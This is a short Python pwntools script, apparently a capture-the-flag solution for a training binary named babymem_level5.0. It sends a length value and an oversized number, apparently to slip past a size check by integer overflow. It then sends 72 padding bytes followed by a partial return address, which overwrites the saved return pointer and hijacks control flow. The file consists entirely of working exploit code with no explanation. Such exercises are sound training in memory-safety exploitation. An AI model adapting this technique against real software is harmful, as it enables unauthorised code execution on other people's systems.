import pwn
r = pwn.process("/challenge/babymem_level5.0")
r.sendline("100")
r.sendline("42949673")
r.send(b'\x00'*72+b'\x29\x16\x40')
print(r.readall())
